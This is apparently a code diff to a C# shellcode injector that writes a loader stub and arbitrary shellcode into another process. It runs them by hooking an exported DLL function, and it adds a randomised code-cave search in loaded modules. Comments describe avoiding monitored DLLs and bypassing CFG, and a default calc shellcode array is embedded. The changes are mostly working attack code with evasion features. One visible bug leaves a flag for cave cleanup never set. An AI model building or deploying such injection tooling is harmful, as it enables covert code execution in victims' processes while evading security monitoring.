@@ -25,6 +25,7 @@ public class RemoteCaveInfo
 {
     public ulong BaseAddress { get; set; }
     public string FullPath { get; set; }
+    public byte[] OriginalCode { get; set; }
 }
 
 public static class RemoteProcesser
@@ -112,13 +113,23 @@ public static class RemoteProcesser
     }
 
     // skips the main exe, as well as heavily monitored Dlls like ntdll.dll, kernel32.dll, kernelbase.dll
-    public static RemoteCaveInfo FindCodeCave(IntPtr hProcess, int requiredSize)
+    public static RemoteCaveInfo FindCodeCave(IntPtr hProcess, int requiredSize, bool randomSearchOrder)
     {
-        var bases = new List<RemoteModuleInfo>();
         var status = QueryRemoteProcessModules(hProcess, out var modules);
         if (status != NTSTATUS.Success)
         {
             Console.WriteLine($"[!] Failed to query remote process modules: {status}");
+        }
+
+        if (randomSearchOrder) // fish my yates shuffle
+        {
+            var rng = new Random();
+            int n = modules.Count;
+            while (n > 1)
+            {
+                int k = rng.Next(n--);
+                (modules[n], modules[k]) = (modules[k], modules[n]); // use tuples, idk C#
+            }
         }
 
         for (int i = 0; i < modules.Count; i++)
@@ -136,7 +147,6 @@ public static class RemoteProcesser
             byte[] moduleBytes = new byte[module.Size];
             uint bytesToRead = module.Size;
             var buf = Marshal.AllocHGlobal((IntPtr)bytesToRead);
-
             NTSTATUS st = ReadVirtualMemory(
                 hProcess,
                 (IntPtr)module.BaseAddress,
@@ -147,63 +157,101 @@ public static class RemoteProcesser
             if (st != NTSTATUS.Success || bytesRead != bytesToRead)
             {
                 Console.WriteLine($"[!] Failed to read module memory of {module.FullPath}, skipping");
+                Marshal.FreeHGlobal(buf);
                 continue;
             }
+            Marshal.Copy(buf, moduleBytes, 0, (int)bytesRead);
+            Marshal.FreeHGlobal(buf);
+
+            // Parse PE headers to find executable sections in current module
+            List<(uint SectionRVA, uint Size, uint Characteristics)> executableSections = new List<(uint, uint, uint)>();
+            try
+            {
+                int e_lfanew = BitConverter.ToInt32(moduleBytes, 0x3C);
+                ushort numberOfSections = BitConverter.ToUInt16(moduleBytes, e_lfanew + 6);
+                ushort sizeOfOptionalHeader = BitConverter.ToUInt16(moduleBytes, e_lfanew + 20);
+                int sectionHeaderOffset = e_lfanew + 24 + sizeOfOptionalHeader;
+
+                const uint IMAGE_SCN_MEM_EXECUTE = 0x20000000;
+
+                for (int s = 0; s < numberOfSections; s++)
+                {
+                    int currentHeader = sectionHeaderOffset + (s * 40);
+                    uint size = BitConverter.ToUInt32(moduleBytes, currentHeader + 8);
+                    uint virtualAddress = BitConverter.ToUInt32(moduleBytes, currentHeader + 12);
+                    uint characteristics = BitConverter.ToUInt32(moduleBytes, currentHeader + 36);
+
+                    if ((characteristics & IMAGE_SCN_MEM_EXECUTE) != 0)
+                    {
+                        executableSections.Add((virtualAddress, size, characteristics));
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[!] Failed to parse PE headers for {module.FullPath}: {ex.Message}, trying next module...");
+                continue;
+            }
+            Console.WriteLine($"[:] Got {executableSections.Count()} exec sections in current module {module.FullPath} at 0x{module.BaseAddress:x}");
 
             // scan for contiguous padding bytes
             int consecutiveCount = 0;
-            int candidateStartIndex = -1;
-            int safeStart = 0x1000; // skip the first 4kB of the module to avoid overwriting the PE header and import table
-            int[] paddingBytes = new int[] { 0x00, 0x90, 0xCC };
+            uint candidateEndRVA = 0;
+            uint dontOverwriteStart = 0x100; // skip the first 256 bytes of the module to avoid overwriting important stuff
+            byte[] paddingBytes = new byte[] { 0x00, 0x90, 0xCC };
 
-            for (int b = safeStart; b < moduleBytes.Length; b++)
+            for (int e = 0; e < executableSections.Count(); e++)
             {
-                if (paddingBytes.Contains(moduleBytes[b]))
+                var section = executableSections[e];
+                Console.WriteLine($"[.] Checking 0x{(module.BaseAddress + section.SectionRVA):x}");
+
+                // start from the end of the module (junk is located there) and scan back
+                for (uint b = section.Size - 1; b >= dontOverwriteStart; b--)
                 {
-                    if (consecutiveCount == 0)
+                    uint currentRVA = section.SectionRVA + b;
+                    byte currentByte = moduleBytes[currentRVA];
+                    if (paddingBytes.Contains(currentByte))
                     {
-                        candidateStartIndex = b;
-                    }
-
-                    consecutiveCount++;
-
-                    if (consecutiveCount >= requiredSize)
-                    {
-                        ulong caveAddress = module.BaseAddress + (ulong)candidateStartIndex;
-                        Console.WriteLine($"[=] Found code cave of size {requiredSize} at 0x{caveAddress:x}");
-                        // dump the first 1kB of the code cave for inspection
-                        byte[] caveChunk = new byte[1024];
-                        Array.Copy(moduleBytes, candidateStartIndex, caveChunk, 0, 1024);
-                        //Console.WriteLine($"[=] Cave bytes: {BitConverter.ToString(caveChunk).Replace("-", " ")}");
-                        return new RemoteCaveInfo
+                        if (consecutiveCount == 0)
                         {
-                            BaseAddress = caveAddress,
-                            FullPath = module.FullPath
-                        };
-                    }
-                }
-                else
-                {
-                    if (consecutiveCount > 1)
+                            candidateEndRVA = currentRVA;
+                        }
+
+                        consecutiveCount++;
+
+                        if (consecutiveCount >= requiredSize) // && candidateEndRVA >= requiredSize - dontOverwriteStart (implied)
+                        {
+                            uint candidateStartRVA = candidateEndRVA - (uint)requiredSize + 1;
+                            ulong caveAddress = module.BaseAddress + candidateStartRVA;
+
+                            // dump the original bytes
+                            byte[] caveChunk = new byte[requiredSize];
+                            Array.Copy(moduleBytes, candidateStartRVA, caveChunk, 0, requiredSize);
+                            //Console.WriteLine($"[=] Cave bytes: {BitConverter.ToString(caveChunk).Replace("-", " ")}");
+
+                            return new RemoteCaveInfo
+                            {
+                                BaseAddress = caveAddress,
+                                FullPath = module.FullPath,
+                                OriginalCode = caveChunk
+                            };
+                        }
+                    } 
+                    else
                     {
-                        Console.WriteLine($"[=] Resetting consecutive count {consecutiveCount} at index {b} in module {module.FullPath}");
+                        consecutiveCount = 0;
+                        candidateEndRVA = 0;
                     }
-                    consecutiveCount = 0;
-                    candidateStartIndex = -1;
                 }
             }
-
-            Console.WriteLine("[!] No suitable code cave found of the requested size.");
-            return new RemoteCaveInfo();
         }
-
         return new RemoteCaveInfo();
     }
 }
 
 internal static class Program
 {
-    //x64 calc shellcode function with ret as default if no shellcode supplied
+    // default x64 calc shellcode with ret (trust me bro)
     private static readonly byte[] CalcX64 =
     {
         0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
@@ -247,24 +295,21 @@ internal static class Program
 
     private static void GenerateHook(long originalInstructions_0_8, int originalInstructions_8_B, long hookedFuncAddr, long virtProtAddr)
     {
-        // This function generates the following shellcode.
-        // The hooked function export is determined by immediately popping the return address and subtracting by 12, size of
-        //     movabs rax, xxxxyyyyxxxxyyyy
-        //     push rax
-        //     ret
+        // This function generates a shellcode loader stub that executes the following sequence:
+        // - Saves volatile registers and loads runtime-patched addresses for the hooked function and VirtualProtect.
+        // - Unprotects the hooked function (RWX), restores its original 12-byte prologue, and reprotects it (RX).
+        // - Executes the inline shellcode payload (relative call to +11h, as shellcode is just appended). -> this would still break CFG
+        // - Restores registers and returns control to the original function via a push-ret sequence (bypassing CFG).
         //
-        // Original function arguments are pushed onto the stack to restore after the injected shellcode is executed
-        // The hooked function bytes are restored to the original values (essentially a one time hook)
-        // A function call is made to the injected shellcode that will follow immediately after the stub
-        // Original function arguments are popped off the stack and restored to the correct registers
-        // A ret back to the original unpatched export restoring program behavior as normal
-        // 
-        // This shellcode loader stub assumes that the injector has left the hooked function RX, so the stub has to call
-        // VirtualProtect to change the hooked function to RWX, restore the original bytes, and then change it back to RX
-        //
-        // re-assemble (yes it is shitty but it works with VS):
-        //   ml64 /c /nologo stub.asm && dumpbin /rawdata stub.obj > stub.dump
-        //   "0x" + ((("  " + (((gc stub.dump -raw) -split "RAW DATA #1")[1] -split "RAW DATA #3")[0].Trim() -split "`n") | % {$_.Substring(12, 48).Trim() -split " "}) -join ", 0x")
+        // How to re-assemble the shellcode loader:
+        // - Save the shellcode stub.asm file
+        // - When VS 2026 installed, open x64 Native Tools Command Prompt for VS 2026
+        //   - ml64 /c /nologo stub.asm && dumpbin /rawdata stub.obj > stub.dump 
+        //   - Then use this shitty PowerShell command to extract the raw bytes (or copy manually like a peasant)
+        //     - "0x" + ((("  " + (((gc stub.dump -raw) -split "RAW DATA #1")[1] -split "RAW DATA #3")[0].Trim() -split "`n") | % {$_.Substring(12, 48).Trim() -split " "}) -join ", 0x")
+        // - Else download NASM 
+        //   - nasm -f win64 stub.asm -o stub.obj
+        //   - Get-Content stub.obj -Encoding Byte | ForEach-Object { "0x{0:X2}" -f $_ }
 
         /*
         .code
@@ -403,6 +448,8 @@ internal static class Program
         string dll = null;
         string export = null;
         var pid = 0;
+        bool searchCodeCave = false;
+        bool randomDllSearch = false;
 
         var optionSet = new OptionSet()
             .Add("h|help", "Display this help", v => showHelp = v != null)
@@ -410,7 +457,9 @@ internal static class Program
                 v => shellcodeStr = v)
             .Add<int>("p=|pid=", @"Target process ID to inject", v => pid = v)
             .Add("d=|dll=", "The DLL that that contains the export to patch (must be KnownDll)", v => dll = v)
-            .Add("e=|export=", "The exported function that will be hijacked", v => export = v);
+            .Add("e=|export=", "The exported function that will be hijacked", v => export = v)
+            .Add("c|codecave", "Search a code cave in the target process to store the shellcode (default: false)", v => searchCodeCave = v != null)
+            .Add("r|randomcave", "Search DLLs in random order for a code cave (default: load order)", v => randomDllSearch = v != null);
 
         try
         {
@@ -466,52 +515,37 @@ internal static class Program
         Console.WriteLine($"[=] Opened process with id {pid}");
 
         var shellcode = LoadShellcode(shellcodeStr);
-
-        // try to find "unused" code, else fall back to AllocMem
         IntPtr loaderAddress = IntPtr.Zero;
         int loaderTotalSize = ShellcodeLoader.Length + shellcode.Length;
-        var CodeCave = RemoteProcesser.FindCodeCave(hProcess, loaderTotalSize);
-        
-        bool foundCodeCave = CodeCave.BaseAddress != 0;
-        byte[] codeCaveOriginalBytes = new byte[loaderTotalSize];
-        IntPtr codeCaveOriginalPtr = Marshal.AllocHGlobal(loaderTotalSize);
 
-        if (foundCodeCave)
+        // check if search code cave is enabled and one is found
+        bool foundCodeCave = false;
+        RemoteCaveInfo CodeCave = new RemoteCaveInfo();
+        if (searchCodeCave)
         {
-            byte[] caveBuffer = new byte[loaderTotalSize];
-            NTSTATUS st = ReadVirtualMemory(
-                hProcess,
-                (IntPtr)CodeCave.BaseAddress,
-                codeCaveOriginalPtr,
-                (uint)loaderTotalSize,
-                out var bytesRead);
-            if (st == NTSTATUS.Success && bytesRead == loaderTotalSize)
+            // try to find "unused" code, else fall back to AllocMem
+            CodeCave = RemoteProcesser.FindCodeCave(hProcess, loaderTotalSize, randomDllSearch);
+            if (CodeCave.BaseAddress == 0 || CodeCave.OriginalCode.Length != loaderTotalSize)
             {
-                loaderAddress = (IntPtr)CodeCave.BaseAddress;
-                Marshal.Copy(codeCaveOriginalPtr, codeCaveOriginalBytes, 0, loaderTotalSize);
+                Console.WriteLine($"[!] No suitable code cave found of the requested size {loaderTotalSize}, falling back to allocation");
             }
             else
             {
-                Console.WriteLine($"[!] Failed to read code cave memory of {CodeCave.FullPath}, falling back to allocation");
+                loaderAddress = (IntPtr)CodeCave.BaseAddress;
+                Console.WriteLine($"[=] Found code cave of size {loaderTotalSize} at 0x{(ulong)loaderAddress:x}");
             }
         }
-        else
-        {
-            Console.WriteLine("[-] Failed to find a code cave, falling back to allocation");
-        }
-        Marshal.FreeHGlobal(codeCaveOriginalPtr);
 
         if (loaderAddress == IntPtr.Zero)
         {
             NTSTATUS st = AllocateVirtualMemory(hProcess, ref loaderAddress, (IntPtr)loaderTotalSize);
             if (st != NTSTATUS.Success)
             {
-                Console.WriteLine("[!] Also failed to allocate memory in the remote process");
+                Console.WriteLine("[!] Failed to allocate memory in the remote process");
                 return;
             }
+            Console.WriteLine($"[=] Allocated loader and shellcode at 0x{(ulong)loaderAddress:x} within PID {pid}");
         }
-
-        Console.WriteLine($"[=] Allocated loader and shellcode at 0x{(long)loaderAddress:x} within PID {pid}");
 
         var kernel32Handle = GetModuleHandle("kernel32.dll");
         if (kernel32Handle == IntPtr.Zero)
@@ -542,12 +576,17 @@ internal static class Program
         BitConverter.GetBytes(loaderAddress.ToInt64()).CopyTo(callOpCode, 2);
 
         // write the hook (call) to the loader stub
-        ProtectVirtualMemory(
+        status = ProtectVirtualMemory(
             hProcess,
             exportAddress,
             (uint)callOpCode.Length,
             MemoryProtection.ExecuteReadWrite,
             out var oldProtectHook);
+        if (status != NTSTATUS.Success)
+        {
+            Console.WriteLine($"[!] Failed to unprotect hook address 0x{exportAddress}:x to RWX");
+            return;
+        }
 
         status = WriteVirtualMemory(
             hProcess,
@@ -557,30 +596,34 @@ internal static class Program
 
         if (status != NTSTATUS.Success || (int)bytesWritten != callOpCode.Length)
         {
-            Console.WriteLine($"[!] Failed to write callOpCode: {status}");
+            Console.WriteLine($"[!] Failed to write hook op code to 0x{exportAddress:x}: {status}");
             return;
         }
         
-        ProtectVirtualMemory(
+        status = ProtectVirtualMemory(
             hProcess,
             exportAddress,
             (uint)callOpCode.Length,
             oldProtectHook,
             out _);
+        if (status != NTSTATUS.Success)
+        {
+            Console.WriteLine($"[!] Failed to  re-protect hook address 0x{exportAddress}:x back to RX");
+            return;
+        }
 
-        // write the shellcode loader stub + shellcode to the code cave
+        // write the shellcode loader stub + shellcode to the remote process (code cave or allocated)
         var payload = ShellcodeLoader.Concat(shellcode).ToArray();
 
         status = ProtectVirtualMemory(
             hProcess,
-            (IntPtr)loaderAddress,
+            loaderAddress,
             (uint)payload.Length,
             MemoryProtection.ReadWrite,
             out var oldProtectLoader);
-
         if (status != NTSTATUS.Success)
         {
-            Console.WriteLine($"[!] Failed to unprotect 0x{loaderAddress:x}");
+            Console.WriteLine($"[!] Failed to unprotect loader address 0x{(ulong)loaderAddress:x} to RWX");
             return;
         }
 
@@ -589,10 +632,9 @@ internal static class Program
             (IntPtr)loaderAddress,
             payload,
             out bytesWritten);
-        
         if (status != NTSTATUS.Success || (int)bytesWritten != payload.Length)
         {
-            Console.WriteLine($"[!] Failed to write payload: {status}");
+            Console.WriteLine($"[!] Failed to write loader+shellcode to 0x{(ulong)loaderAddress:x}: {status}");
             return;
         }
         
@@ -602,10 +644,9 @@ internal static class Program
             (uint)payload.Length,
             oldProtectLoader,
             out _);
-        
         if (status != NTSTATUS.Success)
         {
-            Console.WriteLine($"[!] Failed to protect 0x{loaderAddress:x}");
+            Console.WriteLine($"[!] Failed to re-protect loader address 0x{(ulong)loaderAddress:x} back to RX");
             return;
         }
 
@@ -622,18 +663,25 @@ internal static class Program
             var bytesToRead = 12;
             var buf = Marshal.AllocHGlobal(bytesToRead);
             
-            ReadVirtualMemory(
+            status = ReadVirtualMemory(
                 hProcess,
                 exportAddress,
                 buf,
                 (uint)bytesToRead,
                 out var bytesRead);
+            if (status != NTSTATUS.Success)
+            {
+                executed = false;
+                Console.WriteLine($"[!] Cannot read back hook addr at 0x{(ulong)exportAddress:x} in remote proc, aborting");
+                break; // something is wrong with the remote proc, abort
+            }
 
             var temp = new byte[bytesRead];
             Marshal.Copy(buf, temp, 0, bytesToRead);
             var currentBytes_0_8 = BitConverter.ToInt64(temp, 0);
             var currentBytes_8_B = BitConverter.ToInt32(temp, 8);   
 
+            // original bytes are restored at the start of the shellcode payload -> can only match again if shellcode executed
             if (originalBytes_0_8 == currentBytes_0_8 && originalBytes_8_B == currentBytes_8_B)
             {
                 executed = true;
@@ -649,58 +697,56 @@ internal static class Program
         {
             Console.WriteLine($"[+] Shellcode executed after {timer.Elapsed.TotalSeconds}s and export is restored");
 
-            if (foundCodeCave)
+            if (foundCodeCave) // remove shellcode again from code cave
             {
-                // restore the original bytes of the code cave
-                NTSTATUS st;
-                st = ProtectVirtualMemory(
+                status = ProtectVirtualMemory(
                     hProcess,
-                    (IntPtr)CodeCave.BaseAddress,
+                    loaderAddress,
                     (uint)loaderTotalSize,
                     MemoryProtection.ExecuteReadWrite,
                     out var oldProtectCave);
-                if (st != NTSTATUS.Success)
+                if (status != NTSTATUS.Success)
                 {
-                    Console.WriteLine($"[!] Failed to unprotect code cave at 0x{CodeCave.BaseAddress:x}");
+                    Console.WriteLine($"[!] Failed to unprotect code cave at 0x{(ulong)loaderAddress:x}");
                     return;
                 }
-                st = WriteVirtualMemory(
+                status = WriteVirtualMemory(
                     hProcess,
-                    (IntPtr)CodeCave.BaseAddress,
-                    codeCaveOriginalBytes,
+                    loaderAddress,
+                    CodeCave.OriginalCode,
                     out var bytesWrittenRe);
-                if (st != NTSTATUS.Success)
+                if (status != NTSTATUS.Success)
                 { 
-                    Console.WriteLine($"[!] Failed to restore code cave at 0x{CodeCave.BaseAddress:x}");
+                    Console.WriteLine($"[!] Failed to restore code cave at 0x{(ulong)loaderAddress:x}");
                     return;
                 }
-                st = ProtectVirtualMemory(
+                status = ProtectVirtualMemory(
                     hProcess,
-                    (IntPtr)CodeCave.BaseAddress,
+                    loaderAddress,
                     (uint)loaderTotalSize,
                     oldProtectCave,
                     out _);
-                if (st != NTSTATUS.Success)
+                if (status != NTSTATUS.Success)
                 {
-                    Console.WriteLine($"[!] Failed to protect code cave at 0x{CodeCave.BaseAddress:x}");
+                    Console.WriteLine($"[!] Failed to protect code cave at 0x{(ulong)loaderAddress:x}");
                     return;
                 }
 
-                Console.WriteLine($"[+] Restored original bytes of code cave at 0x{CodeCave.BaseAddress:x}");
+                Console.WriteLine($"[+] Restored original bytes of code cave at 0x{(ulong)loaderAddress:x}");
 
             } 
             else
             {
-                // just free the allocated memory for the loader and shellcode
+                // no code cave -> just free the allocated (loader) memory
                 FreeVirtualMemory(
                     hProcess,
-                    (IntPtr)loaderAddress);
+                    loaderAddress);
             }
 
         }
         else
         {
-            Console.WriteLine("[!] Shellcode did not trigger within 60s, it may still execute but we are not cleaning up");
+            Console.WriteLine($"[!] Shellcode did not trigger within 60s, it may still execute but we are not cleaning up shellcode at 0x{(ulong)loaderAddress:x}");
         }
 
         CloseHandle(hProcess);
